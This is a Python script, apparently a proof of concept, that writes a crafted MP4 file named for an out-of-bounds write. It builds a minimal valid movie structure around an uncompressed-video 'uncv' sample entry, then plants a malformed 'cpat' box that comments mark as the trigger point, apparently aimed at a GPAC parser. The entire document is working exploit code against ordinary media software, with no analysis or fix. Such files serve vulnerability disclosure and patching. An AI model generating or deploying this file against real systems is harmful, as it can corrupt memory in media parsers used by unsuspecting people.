#!/usr/bin/env python3
import struct

def u8(x):  return struct.pack(">B", x & 0xFF)
def u16(x): return struct.pack(">H", x & 0xFFFF)
def u32(x): return struct.pack(">I", x & 0xFFFFFFFF)

def fixed16_16(x_float: float) -> bytes:
    return u32(int(x_float * (1 << 16)) & 0xFFFFFFFF)

def box(typ: bytes, payload: bytes) -> bytes:
    assert len(typ) == 4
    return u32(8 + len(payload)) + typ + payload

def fullbox(typ: bytes, version: int, flags24: int, payload: bytes) -> bytes:
    vf = u8(version) + struct.pack(">I", flags24 & 0xFFFFFF)[1:]  # 1+3 bytes
    return box(typ, vf + payload)

def make_ftyp() -> bytes:
    major = b"isom"
    minor = u32(0)
    brands = b"isom" + b"iso2" + b"mp41"
    return box(b"ftyp", major + minor + brands)

def make_mvhd(timescale=1000, duration=1000) -> bytes:
    # version 0
    payload = (
        u32(0) +  # creation_time
        u32(0) +  # modification_time
        u32(timescale) +
        u32(duration) +
        fixed16_16(1.0) +     # rate
        u16(0x0100) + u16(0)  # volume + reserved
        + u32(0) + u32(0)     # reserved
        + u32(0) + u32(0)
    )
    # unity matrix
    payload += (
        u32(0x00010000) + u32(0) + u32(0) +
        u32(0) + u32(0x00010000) + u32(0) +
        u32(0) + u32(0) + u32(0x40000000)
    )
    payload += b"\x00" * 24  # pre_defined
    payload += u32(2)        # next_track_ID
    return fullbox(b"mvhd", 0, 0, payload)

def make_tkhd(track_id=1, duration=1000, width=1, height=1) -> bytes:
    # flags: track enabled/in movie/in preview = 0x000007
    flags = 0x000007
    payload = (
        u32(0) + u32(0) +     # creation/modification
        u32(track_id) +
        u32(0) +              # reserved
        u32(duration) +
        u32(0) + u32(0) +     # reserved
        u16(0) + u16(0) +     # layer, alternate_group
        u16(0) + u16(0)       # volume, reserved
    )
    # matrix
    payload += (
        u32(0x00010000) + u32(0) + u32(0) +
        u32(0) + u32(0x00010000) + u32(0) +
        u32(0) + u32(0) + u32(0x40000000)
    )
    payload += u32(width << 16) + u32(height << 16)
    return fullbox(b"tkhd", 0, flags, payload)

def make_mdhd(timescale=1000, duration=1000) -> bytes:
    payload = (
        u32(0) + u32(0) +
        u32(timescale) +
        u32(duration) +
        u16(0x55c4) +  # 'und' language (packed), common placeholder
        u16(0)
    )
    return fullbox(b"mdhd", 0, 0, payload)

def make_hdlr(handler_type=b"vide", name=b"GPAC") -> bytes:
    payload = (
        u32(0) +              # pre_defined
        handler_type +
        u32(0) + u32(0) + u32(0) +  # reserved
        name + b"\x00"
    )
    return fullbox(b"hdlr", 0, 0, payload)

def make_vmhd() -> bytes:
    # flags 0x000001 per spec
    payload = u16(0) + u16(0) + u16(0) + u16(0)  # graphicsmode + opcolor
    return fullbox(b"vmhd", 0, 0x000001, payload)

def make_dinf() -> bytes:
    # dref with one url box (self-contained)
    url  = fullbox(b"url ", 0, 0x000001, b"")
    dref = fullbox(b"dref", 0, 0, u32(1) + url)
    return box(b"dinf", dref)

def make_stts() -> bytes:
    # 1 sample, 1 delta
    return fullbox(b"stts", 0, 0, u32(1) + u32(1) + u32(1))

def make_stsc() -> bytes:
    # one chunk, one sample per chunk, sample desc idx =1
    return fullbox(b"stsc", 0, 0, u32(1) + u32(1) + u32(1) + u32(1))

def make_stsz(sample_size: int) -> bytes:
    # no default size, 1 entry
    return fullbox(b"stsz", 0, 0, u32(0) + u32(1) + u32(sample_size))

def make_stco(chunk_offset: int) -> bytes:
    return fullbox(b"stco", 0, 0, u32(1) + u32(chunk_offset))

def make_uncv_config_boxes() -> bytes:
    # --- cmpd ---
    # nb_comp_defs=1, one type=u16(0)
    cmpd_payload = u32(1) + u16(0)
    cmpd = box(b"cmpd", cmpd_payload)

    # --- uncC (version 0 path) ---
    # version=0, flags=0
    # profile any u32; not validated in version 0 path
    profile = b"rgba"
    nb_comps = 1
    comps = (
        u16(0) +     # idx
        u8(0) +      # bits_minus_1 -> bits=1
        u8(0) +      # format
        u8(0)        # align_size
    )
    sampling = u8(0)
    interleave = u8(1)
    block_size = u8(0)
    bitflags = u8(0)  # 5 flags + 3 reserved bits, packed as 1 byte
    pixel_size = u32(1)
    row_align = u32(0)
    tile_align = u32(0)
    num_tile_cols_m1 = u32(0)
    num_tile_rows_m1 = u32(0)

    uncc_payload = (
        profile +
        u32(nb_comps) +
        comps +
        sampling + interleave + block_size + bitflags +
        pixel_size + row_align + tile_align + num_tile_cols_m1 + num_tile_rows_m1
    )
    uncC = fullbox(b"uncC", 0, 0, uncc_payload)

    # --- cpat (触发点) ---
    # version=0, flags=0, fa_width=1, fa_height=2
    # entries: fa_width*fa_height, each entry: u32 + float(4)
    fa_w, fa_h = 1, 2
    entries = b""
    # 2 cells: write u32 (will be truncated to u16 in fa_map), then float
    # float 用 IEEE754 big-endian；这里随便给 0.0
    entries += u32(0x11111111) + struct.pack(">f", 0.0)
    entries += u32(0x22222222) + struct.pack(">f", 0.0)

    cpat_payload = u16(fa_w) + u16(fa_h) + entries
    cpat = fullbox(b"cpat", 0, 0, cpat_payload)

    return cmpd + uncC + cpat

def make_stsd_uncv(width=1, height=1) -> bytes:
    # VisualSampleEntry for 'uncv'
    # SampleEntry header: 6 reserved + data_reference_index
    se = b"\x00"*6 + u16(1)

    # VisualSampleEntry fields (ISO/IEC 14496-12)
    se += (
        u16(0) + u16(0) +     # pre_defined, reserved
        u32(0) + u32(0) + u32(0) +  # pre_defined[3]
        u16(width) + u16(height) +
        u32(0x00480000) + u32(0x00480000) +  # horiz/vert resolution 72 dpi
        u32(0) +              # reserved
        u16(1)                # frame_count
    )
    compressor = b"UNCV PoC"
    compressor = compressor[:31]
    se += u8(len(compressor)) + compressor + b"\x00"*(31-len(compressor))
    se += u16(0x0018) + u16(0xFFFF)  # depth, pre_defined

    # Append UNCV config boxes
    se += make_uncv_config_boxes()

    sample_entry = box(b"uncv", se)
    stsd_payload = u32(1) + sample_entry  # entry_count=1
    return fullbox(b"stsd", 0, 0, stsd_payload)

def make_minf_stbl(sample_size: int, chunk_offset_placeholder: int) -> bytes:
    stsd = make_stsd_uncv(1, 1)
    stts = make_stts()
    stsc = make_stsc()
    stsz = make_stsz(sample_size)
    stco = make_stco(chunk_offset_placeholder)  # patched later
    stbl = box(b"stbl", stsd + stts + stsc + stsz + stco)
    minf = box(b"minf", make_vmhd() + make_dinf() + stbl)
    return minf

def make_moov(sample_size: int, chunk_offset_placeholder: int) -> bytes:
    mvhd = make_mvhd()
    tkhd = make_tkhd()
    mdhd = make_mdhd()
    hdlr = make_hdlr()
    minf = make_minf_stbl(sample_size, chunk_offset_placeholder)
    mdia = box(b"mdia", mdhd + hdlr + minf)
    trak = box(b"trak", tkhd + mdia)
    return box(b"moov", mvhd + trak)

def patch_stco(mp4: bytearray, real_chunk_offset: int) -> None:
    # Find 'stco' box and patch its last u32 (the first and only chunk offset).
    idx = mp4.find(b"stco")
    if idx == -1:
        raise RuntimeError("stco not found")
    # stco structure: size(4) type(4) version/flags(4) entry_count(4) offset(4)
    # 'stco' points to the type field; size is at idx-4
    # offset field begins at: (idx - 4) + 8 + 4 + 4 = idx + 12
    offset_pos = idx + 12
    mp4[offset_pos:offset_pos+4] = u32(real_chunk_offset)

def main(out_path="poc_uncv_cpat_oobwrite.mp4"):
    sample_data = b"\x00"  # one dummy sample byte
    mdat = box(b"mdat", sample_data)

    # build with placeholder stco first
    ftyp = make_ftyp()
    moov = make_moov(sample_size=len(sample_data), chunk_offset_placeholder=0)

    mp4 = bytearray(ftyp + moov + mdat)

    # real chunk offset = position of mdat payload start
    # mdat header is 8 bytes, so payload starts at (ftyp+moov)+8
    mdat_pos = len(ftyp) + len(moov)
    real_chunk_offset = mdat_pos + 8

    patch_stco(mp4, real_chunk_offset)

    with open(out_path, "wb") as f:
        f.write(mp4)

    print(f"[+] wrote {out_path} ({len(mp4)} bytes)")
    print(f"[+] mdat payload offset = {real_chunk_offset}")

if __name__ == "__main__":
    main()
